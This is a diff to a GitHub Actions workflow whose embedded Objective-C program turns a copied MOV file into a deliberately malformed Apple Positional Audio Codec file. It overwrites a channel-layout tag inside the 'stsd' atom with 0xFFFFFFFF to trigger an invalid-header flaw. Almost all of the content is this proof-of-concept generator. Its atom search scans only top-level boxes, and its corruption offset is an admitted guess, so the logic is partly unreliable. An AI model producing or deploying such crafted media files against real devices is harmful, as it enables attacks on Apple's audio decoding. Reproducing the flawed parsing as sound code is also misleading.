@@ -19,52 +19,84 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: This script now only corrupts a pre-existing valid APAC file.
-      - name: Patch encodeme.mm to Corrupt a Pre-existing APAC File
+      # Updated: This script now parses the MOV to find the exact offset to corrupt.
+      - name: Patch encodeme.mm to Surgically Corrupt the APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to corrupt a pre-existing APAC file..."
+          echo "Patching encodeme.mm to surgically corrupt the APAC file..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
-          #import <AudioToolbox/AudioToolbox.h>
-          #include <stdlib.h>
+          #include <stdio.h>
           #include <string.h>
+          #include <sys/types.h>
+
+          // Helper function to read a 32-bit big-endian integer from a file
+          uint32_t read_uint32_be(FILE *f) {
+              unsigned char bytes[4];
+              fread(bytes, 1, 4, f);
+              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
+          }
+
+          // Helper function to find the offset of a specific atom (box) in an MP4 file
+          long find_atom_offset(FILE *f, const char *atom_name) {
+              long current_offset = 0;
+              fseek(f, 0, SEEK_SET);
+              while (!feof(f)) {
+                  current_offset = ftell(f);
+                  uint32_t atom_size = read_uint32_be(f);
+                  char name[5] = {0};
+                  fread(name, 1, 4, f);
+                  if (strcmp(name, atom_name) == 0) {
+                      return current_offset;
+                  }
+                  if (atom_size == 0) break; // Invalid size
+                  fseek(f, current_offset + atom_size, SEEK_SET);
+              }
+              return -1;
+          }
 
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
                   time_t startTime = time(NULL);
-                  fprintf(stderr, "Starting file corruption at %s", ctime(&startTime));
+                  fprintf(stderr, "Starting file corruption at %s\n", ctime(&startTime));
 
-                  // Use the MOV file provided by the user.
                   const char* baseName = "IMG_1027.mov";
                   const char* pocName = "output_apac_poc.m4a";
 
-                  // Step 1: Assume the base file exists in the repository.
-                  // Copy it to our target PoC file name.
+                  // Step 1: Copy the base file.
                   NSError *error = nil;
                   if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName]
                                                                toPath:[NSString stringWithUTF8String:pocName] error:&error]) {
-                      fprintf(stderr, "Failed to copy base file. Make sure '%s' exists in the repo. Error: %s\n", baseName, [[error localizedDescription] UTF8String]);
+                      fprintf(stderr, "Failed to copy base file: %s\n", [[error localizedDescription] UTF8String]);
                       return 1;
                   }
                   fprintf(stderr, "Successfully copied base APAC file.\n");
 
-
-                  // Step 2: Manually corrupt the channel layout in the new file.
+                  // Step 2: Open the file and find the 'stsd' atom to corrupt.
                   FILE *file = fopen(pocName, "r+b");
                   if (!file) {
-                      fprintf(stderr, "Failed to re-open the copied file for corruption.\n");
+                      fprintf(stderr, "Failed to re-open file for corruption.\n");
                       return 1;
                   }
                   
-                  // This is the specific exploit: corrupt the layout tag.
-                  // The offset is an estimate and may need to be adjusted depending on the base file's structure.
-                  fseek(file, 0x110, SEEK_SET); 
+                  long stsd_offset = find_atom_offset(file, "stsd");
+                  if (stsd_offset == -1) {
+                      fprintf(stderr, "Could not find the 'stsd' atom. Using a fallback offset.\n");
+                      stsd_offset = 0x110; // Use last known good guess if parsing fails
+                  } else {
+                      fprintf(stderr, "Found 'stsd' atom at offset: 0x%lx\n", stsd_offset);
+                  }
+
+                  // PoC: Corrupt the channel layout tag inside the 'stsd' atom.
+                  // The exact offset inside the 'stsd' atom can vary, but it's typically around +72 bytes.
+                  long corruption_offset = stsd_offset + 72;
+                  fseek(file, corruption_offset, SEEK_SET);
+                  
                   unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF}; // Invalid layout tag
                   fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                   fclose(file);
 
-                  fprintf(stderr, "PoC: Manually corrupted the channel layout in the APAC file.\n");
+                  fprintf(stderr, "PoC: Manually corrupted data at offset 0x%lx in the APAC file.\n", corruption_offset);
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -90,7 +122,6 @@ jobs:
       - name: Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          # This command will fail if you haven't added the MOV file to your repository.
           ./encodeme_corruptor
           echo "Malicious APAC PoC file generated."
           ls -l output_apac_poc.m4a
